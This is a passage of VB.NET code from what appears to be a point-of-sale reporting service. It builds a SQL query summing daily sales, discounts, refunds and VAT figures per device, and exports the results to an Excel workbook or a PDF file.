                    " AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    ",0) + " & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(custpay.ChargeAmount,0)) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    ",0) + " & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(srledger.Fees, 0) + ISNULL(srledger.RefundFees, 0)) " & vbCrLf &
                    " FROM TransSalesReturnLedger srledger " & vbCrLf &
                    " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID) " & vbCrLf &
                    " WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND memo.FOWSTID = inv.FowstID " & vbCrLf &
                    " AND memo.DeviceID = inv.DeviceID) " & vbCrLf &
                    ",0) " & vbCrLf &
                    ") as AccumulatedTotal" & vbCrLf

                If Not CBool2(header.Rows(0)("IsVAT")) Then
                    pSql &= ", ISNULL((SELECT SUM(invitem.GrossSalesNetOfVATExemptions)" & vbCrLf &
                            "FROM TransInvoiceItems invitem" & vbCrLf &
                            "INNER JOIN TransInvoice sub_inv ON (invitem.InvoiceID = sub_inv.ID)" & vbCrLf &
                            "WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                            "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                            "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                            "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                            ",0) " & vbCrLf &
                            " - ISNULL(tblDiscount.Sum, 0) " & vbCrLf &
                            " - ISNULL(tblRefund.Sum, 0) " & vbCrLf &
                            " - ISNULL((SELECT SUM(srledger.GrossSrvAmount) " & vbCrLf &
                            " FROM TransSalesReturnLedger srledger " & vbCrLf &
                            " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID) " & vbCrLf &
                            " WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                            " AND memo.FOWSTID = inv.FowstID " & vbCrLf &
                            " AND memo.DeviceID = inv.DeviceID) " & vbCrLf &
                            ",0) " & vbCrLf &
                            " - ISNULL((SELECT SUM(sub_inv.ForegoneVAT) " & vbCrLf &
                            " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                            " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                            " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)  " & vbCrLf &
                            " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' " & vbCrLf &
                            " AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                            " AND sub_inv.FOWSTID = inv.FowstID " & vbCrLf &
                            " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                            ",0)" & vbCrLf &
                            " + ISNULL((SELECT SUM(ISNULL(srledger.Fees, 0) + ISNULL(srledger.RefundFees, 0)) " & vbCrLf &
                            " FROM TransSalesReturnLedger srledger " & vbCrLf &
                            " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID) " & vbCrLf &
                            " WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                            " AND memo.FOWSTID = inv.FowstID " & vbCrLf &
                            " AND memo.DeviceID = inv.DeviceID) " & vbCrLf &
                            ",0) +" & vbCrLf &
                            "ISNULL((SELECT SUM(ISNULL(charge.ChargeAmount, 0)) " & vbCrLf &
                            " FROM TransInvoice sub_inv " & vbCrLf &
                            " INNER JOIN TransInvoiceCharges charge ON (sub_inv.ID = charge.InvoiceID) " & vbCrLf &
                            " WHERE sub_inv.InvoiceNumber > 0 " & vbCrLf &
                            " AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                            " AND sub_inv.FOWSTID = inv.FowstID " & vbCrLf &
                            " AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                            ",0) " & vbCrLf &
                            " AS NonVAT " & vbCrLf
                Else
                    pSql &= " , 0 as NonVAT " & vbCrLf
                End If

                pSql &= "FROM TransInvoice as inv" & vbCrLf &
                    "OUTER APPLY(" & vbCrLf &
                    "SELECT SUM(custpay.DiscountAmount) AS Sum" & vbCrLf &
                    ",COUNT(DISTINCT custpayinv.InvoiceID) AS Count" & vbCrLf &
                    "FROM TransCustomerPaymentInvoices custpayinv" & vbCrLf &
                    "INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)" & vbCrLf &
                    "INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)" & vbCrLf &
                    "INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID" & vbCrLf &
                    "--AND disc.DiscountTypeID NOT IN ('055a0a33-dd98-47ec-add3-8b2009f3944a', '34a4032f-a142-4c15-a868-4ac4410434df')" & vbCrLf &
                    "WHERE sub_inv.InvoiceNumber > 0 And custpay.ReceiptType <> 'RF' --AND disc.NoOfSeniorCitizens IS NULL" & vbCrLf &
                    "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID" & vbCrLf &
                    ") as tblDiscount" & vbCrLf &
                    "OUTER APPLY (" & vbCrLf &
                    " 	SELECT SUM(srledger.GrossRefundAmount) AS Sum" & vbCrLf &
                    "   ,COUNT(DISTINCT memo.id) AS Count" & vbCrLf &
                    "  	FROM TransSalesReturnLedger srledger" & vbCrLf &
                    "  	JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID)" & vbCrLf &
                    "   WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "  	AND memo.FOWSTID = inv.FowstID" & vbCrLf &
                    "  	AND memo.DeviceID = inv.DeviceID" & vbCrLf &
                    " 	AND srledger.GrossRefundAmount > 0" & vbCrLf &
                    " ) as tblRefund" & vbCrLf &
                    "WHERE inv.FOWSTID = " & ReadyString(fowstid) & " AND inv.DeviceID = " & ReadyString(deviceid) & vbCrLf &
                    "AND CONVERT(date, inv.InvoiceDate) BETWEEN " & ReadyString(datefrom) & " AND " & ReadyString(dateto) & vbCrLf &
                    "GROUP BY CONVERT(date, inv.InvoiceDate), inv.FOWSTID, inv.DeviceID, tblDiscount.Sum, tblRefund.Sum" & vbCrLf &
                    "ORDER BY CONVERT(date, inv.InvoiceDate) ASC"
                Dim salesdata As DataTable = Common.WebRequest.ProData.Execute(pSql)
                pReport.AddTable("Data", salesdata)

                If fileformat = "xlsx" Then
                    Dim pWB As Aspose.Cells.Workbook
                    Dim worksheet As Aspose.Cells.Worksheet
                    Dim headerCtr As Integer = 0
                    Dim rowCtr As Integer = 0

                    pWB = New Aspose.Cells.Workbook
                    worksheet = pWB.Worksheets(0)
                    worksheet.Name = "Details"

                    Dim tblHeader As New List(Of String)(New String() {"Date", "Invoice No. From", "Invoice No. To", "Gross Sales", "Cash Sales", "Credit Sales", "SC Discount", "PWD Discount", "VATable Sales", "VAT Exempt", "Non-VAT", "Zero Rated", "Accumulated Total"})

                    For Each head As String In tblHeader
                        worksheet.Cells(rowCtr, headerCtr).PutValue(head)
                        worksheet.Cells(rowCtr, headerCtr).Style.ForegroundColor = Color.FromArgb(242, 187, 70)
                        worksheet.Cells(rowCtr, headerCtr).Style.Pattern = BackgroundType.Solid
                        worksheet.Cells(rowCtr, headerCtr).Style.Font.Size = 12
                        worksheet.Cells(rowCtr, headerCtr).Style.Font.IsBold = True
                        worksheet.Cells(rowCtr, headerCtr).Style.HorizontalAlignment = TextAlignmentType.Center
                        worksheet.Cells(rowCtr, headerCtr).Style.VerticalAlignment = TextAlignmentType.Center
                        headerCtr += 1
                    Next

                    rowCtr += 1

                    For Each sale As DataRow In salesdata.Rows
                        worksheet.Cells(rowCtr, 0).PutValue(Format(CDate(sale("InvoiceDate")), "MM-dd-yyyy"))
                        worksheet.Cells(rowCtr, 1).PutValue(CDec2(sale("BegInvoiceNumber")))
                        worksheet.Cells(rowCtr, 2).PutValue(CDec2(sale("EndInvoiceNumber")))
                        worksheet.Cells(rowCtr, 3).PutValue(Format(CDec2(sale("GrossSales")), "#,##0.00"))
                        worksheet.Cells(rowCtr, 4).PutValue(Format(CDec2(sale("CashAmount")), "#,##0.00"))
                        worksheet.Cells(rowCtr, 5).PutValue(Format(CDec2(sale("CreditSales")), "#,##0.00"))
                        worksheet.Cells(rowCtr, 6).PutValue(Format(CDec2(sale("SCAmount")), "#,##0.00"))
                        worksheet.Cells(rowCtr, 7).PutValue(Format(CDec2(sale("PWDAmount")), "#,##0.00"))

                        If CBool2(header(0)("IsVAT")) Then
                            worksheet.Cells(rowCtr, 8).PutValue(Format(CDec2(sale("VatableSales")), "#,##0.00"))
                            worksheet.Cells(rowCtr, 9).PutValue(Format(CDec2(sale("VATExempt")), "#,##0.00"))
                            worksheet.Cells(rowCtr, 10).PutValue("0.00")
                        Else
                            worksheet.Cells(rowCtr, 8).PutValue("0.00")
                            worksheet.Cells(rowCtr, 9).PutValue("0.00")
                            worksheet.Cells(rowCtr, 10).PutValue(Format(CDec2(sale("NonVAT")), "#,##0.00"))
                        End If

                        worksheet.Cells(rowCtr, 11).PutValue("0.00")
                        worksheet.Cells(rowCtr, 12).PutValue(Format(CDec2(sale("AccumulatedTotal")), "#,##0.00"))
                        rowCtr += 1
                    Next

                    worksheet.FreezePanes("A2", 1, 0)
                    worksheet.AutoFitColumns()
                    worksheet.AutoFitRows()

                    pWB.Save(filepath)
                Else
                    pReport.ExportXmlFile()
                    pReport.ExportFile(ProReport.eExportFormat.Pdf, filepath)
                End If

                'Dim file As New System.IO.FileInfo(filepath)

                'Response.Clear()
                'Response.AddHeader("Content-Disposition", "attachment; filename=" & filename)
                'Response.AddHeader("Content-Length", file.Length.ToString())
                'Response.ContentType = "application/octet-stream"
                'Response.WriteFile(file.FullName)
                'Response.End()

            Catch ex As Exception
                AppendToLog(ex.Message)
                Return ex.Message & GetStackTrace(, ex).Replace(vbCrLf, "<br />")
            End Try
        End Function

    End Class
End Namespace